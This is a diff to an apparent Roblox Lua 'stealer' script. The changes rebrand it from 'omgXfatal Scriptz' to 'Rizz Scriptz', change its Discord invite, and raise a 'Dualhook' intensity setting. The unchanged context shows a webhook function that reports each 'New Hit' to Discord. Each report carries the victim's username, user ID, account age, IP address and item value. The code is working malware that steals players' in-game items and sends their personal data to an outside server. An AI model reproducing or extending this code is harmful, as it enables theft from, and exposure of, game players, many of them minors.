@@ -21,7 +21,7 @@ getgenv().Settings = {
     },
     Huges = {
         Dualhook = true,
-        Intensity = 10 --%
+        Intensity = 20 --%
     },
     Pogs = {
         Dualhook = true,
@@ -958,11 +958,11 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "omgXfatal Scriptz",
+            ["username"] = "Rizz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With omgXfatal||",
-                ["url"] = "https://discord.gg/fatalcm",
+                ["title"] = "**New Hit** ||With Rizz||",
+                ["url"] = "https://discord.gg/uSgzNwHDTS",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -971,7 +971,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using omgXfatal Scriptz's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1028,10 +1028,10 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "OmgzXFatals Scriptz",
+            ["username"] = "Rizz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With OmgXfatal||",
+                ["title"] = "**New Hit** ||With Rizz||",
                 ["url"] = "https://discord.gg/uSgzNwHDTS",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
